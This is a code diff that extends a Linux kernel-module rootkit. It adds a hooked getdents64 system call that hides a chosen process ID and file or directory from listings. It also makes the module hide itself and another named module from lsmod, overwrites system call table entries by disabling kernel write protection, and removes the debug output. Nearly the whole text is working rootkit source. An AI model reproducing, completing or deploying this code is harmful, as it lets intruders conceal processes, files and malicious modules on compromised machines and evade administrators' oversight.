@@ -27,6 +27,9 @@ static unsigned long *sys_call_table;
 typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
 orig_getdents_t orig_getdents;
 
+typedef asmlinkage long (*orig_getdents_t64)(unsigned int, struct linux_dirent64 *, unsigned int);
+orig_getdents_t64 orig_getdents64;
+
 #define START_MEM PAGE_OFFSET
 #define END_MEM ULONG_MAX
 
@@ -37,6 +40,7 @@ static int hide_pid = -1;
 module_param(hide_mod, charp, 0000); // which lkm should be deleted from kernel structures
 module_param(hide_dir, charp, 0000); // which directory/file should be hidden from ls
 module_param(hide_pid, int, 0000);	 // which pid process should be hidden from ps
+MODULE_LICENSE("GPL v2"); // this actually solves a lot of bugs
 
 // get syscall table dinamically
 unsigned long *
@@ -103,6 +107,56 @@ hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
     return or;
 }
 
+//getdents64 hook
+asmlinkage static long
+hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+    struct linux_dirent64 *t1, *t2;
+    int next, hide;
+    unsigned long hpid, nwarm;
+	long or, tmp;
+    
+	or = (*orig_getdents64)(fd, dirp, count);
+    if(!or) return 0;
+
+    t2 = (struct linux_dirent64 *) kmalloc(or, GFP_KERNEL);
+    __copy_from_user(t2, dirp, or);
+    t1 = t2;
+    tmp = or;
+
+    while(tmp > 0){
+        tmp -= t1->d_reclen;
+        next = 1;
+        hide = 0;
+
+        // ps->find
+        hpid = simple_strtoul(t1->d_name, NULL, 10);
+		if(hide_pid == hpid){
+            struct task_struct *htask = current;
+            do{
+                if(htask->pid == hpid){ 
+                    hide = 1;
+                    break;
+                }
+                htask = next_task(htask);
+            } while(htask != current);
+        }
+
+		// ls + ps->hide
+        if(hide || strstr(t1->d_name, hide_dir)){
+            or -= t1->d_reclen;
+            next = 0;
+            if(tmp) memmove(t1, (char *) t1 + t1->d_reclen, tmp);
+        }
+
+        if(tmp && next) t1 = (struct linux_dirent64 *) ((char *) t1 + t1->d_reclen);
+    }
+
+    nwarm = __copy_to_user((void *) dirp, (void *) t2, or);
+    kfree(t2);
+
+    return or;
+}
+
 static void module_hide(struct module *mod){
     list_del(&mod->list);
     kobject_del(&mod->mkobj.kobj);
@@ -114,33 +168,34 @@ syshook_init(void) {
     sys_call_table = (unsigned long *)get_syscall_table_bf();
     cr0 = read_cr0();
 
-    printk("module h4ck3r initiado\n");
-    printk("%s\n", &THIS_MODULE->name);
-    //lsmod
-    printk("%s\n", hide_mod);
+    // hide this lkm
+    module_hide(THIS_MODULE);
+
+    // hide another lkm (lsmod)
     if(strcmp(hide_mod, "") != 0){
         struct module *mod;
 
-        //mutex_lock(&module_mutex);
-        //mod = find_module(hide_mod);
-        //mutex_unlock(&module_mutex);
+        mutex_lock(&module_mutex);
+        mod = find_module(hide_mod);
+        mutex_unlock(&module_mutex);
 
-        printk("hiding module\n");
         if(mod) module_hide(mod);
-
-    } else printk("n veio args pro hidemod\n");
+    }
 
     //// serious stuff
-    //module_hide(THIS_MODULE);
     if(sys_call_table == NULL){
         printk(KERN_INFO "sys_call_table not fount");
         return -1;
     }
 
+	// back up original syscalls addresses
     orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
+    orig_getdents64 = (orig_getdents_t64)sys_call_table[__NR_getdents64];
 
+	// overwrite their addresses
     write_cr0(cr0 & ~0x00010000);
     sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+    sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
     write_cr0(cr0);
 
     return 0;
@@ -153,8 +208,11 @@ syshook_cleanup(void){
         sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
         write_cr0(cr0);
     }
-    printk("moduli h4ck3r tchautchau\n");
-
+    if(orig_getdents64){
+        write_cr0(cr0 & ~0x00010000);
+        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+        write_cr0(cr0);
+    }
 }
 
 module_init(syshook_init);
